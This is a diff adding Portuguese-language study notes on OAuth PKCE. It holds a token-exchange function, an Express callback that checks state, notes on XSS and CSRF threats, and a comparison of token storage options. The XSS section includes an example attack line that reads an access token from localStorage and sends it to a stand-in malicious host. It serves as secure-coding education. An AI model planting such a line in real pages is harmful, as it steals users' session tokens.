@@ -428,4 +428,111 @@ PKCE garante que mesmo que o retorno seja capturado, a troca do código será im
 
 
 /* ------------------------------------------------------------------------------------------------ */
+
+-- Função para troca de código
+
+async function exchangeCodeForToken(code, codeVerifier, redirectUri) {
+  const payload = new URLSearchParams();
+  payload.append("grant_type", "authorization_code");
+  payload.append("code", code);
+  payload.append("redirect_uri", redirectUri);
+  payload.append("code_verifier", codeVerifier);
+  payload.append("client_id", process.env.CLIENT_ID);
+
+  const response = await fetch(process.env.OAUTH_TOKEN_URL, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    body: payload
+  });
+
+  if (!response.ok) {
+    const errorBody = await response.text();
+    throw new Error(`Token endpoint error: ${errorBody}`);
+  }
+
+  return response.json();
+}
+
+
+-- Endpoint Backend para receber o código
+
+app.post("/oauth/callback", async (req, res) => {
+  const { code, state } = req.body;
+
+  const storedState = req.session.oauth_state;
+  const codeVerifier = req.session.code_verifier;
+
+  if (state !== storedState) {
+    return res.status(400).json({ error: "Invalid state" });
+  }
+
+  try {
+    const tokenResponse = await exchangeCodeForToken(code, codeVerifier, process.env.REDIRECT_URI);
+
+    req.session.access_token = tokenResponse.access_token;
+
+    if (tokenResponse.refresh_token) {
+      req.session.refresh_token = tokenResponse.refresh_token;
+    }
+
+    return res.json({ status: "ok" });
+  } catch (err) {
+    return res.status(500).json({ error: "Token exchange failed" });
+  }
+});
+
+
+/* ------------------------------------------------------------------------------------------------ */
+
+-- Ameaças Principais
+
+1.XSS (Cross-Site Scripting)
+
+Um ataque XSS permite que um invasor injete JavaScript arbitrário na página. Se o token estiver acessível ao JavaScript (ex: localStorage), ele pode ser roubado facilmente.
+
+Exemplo de ataque:
+// Invasor executa via XSS
+const token = localStorage.getItem('access_token');
+fetch('https://malicioso.com/roubar?token=' + token);
+
+Se o token estiver em localStorage, o atacante consegue lê-lo imediatamente.
+
+
+2.CSRF (Cross-Site Request Forgery)
+
+Ocorre quando um invasor faz requisições usando cookies do usuário sem seu conhecimento. Se o access token estiver em cookies automaticamente enviados, o risco aumenta.
+
+Exemplo típico: um site malicioso faz uma requisição para sua API usando cookies legítimos do usuário.
+
+
+/* ------------------------------------------------------------------------------------------------ */
+
+
+/* ------------------------------------------------------------------------------------------------ */
+
+-- Comparação Geral:
+
+1.localStorage
+Perigoso
+Exposto a XSS
+Nunca recomendado para tokens
+
+2.sessionStorage
+Mesmo risco de localStorage
+Apenas um pouco mais seguro por não persistir
+
+3.Cookies HttpOnly
+Ótimos para refresh tokens
+Proteção contra XSS
+Configuração adequada de SameSite e CSRF necessária
+
+4.In-Memory
+Melhor local para access tokens
+Volátil e seguro
+
+
+/* ------------------------------------------------------------------------------------------------ */
+/* ------------------------------------------------------------------------------------------------ */
 /* ------------------------------------------------------------------------------------------------ */
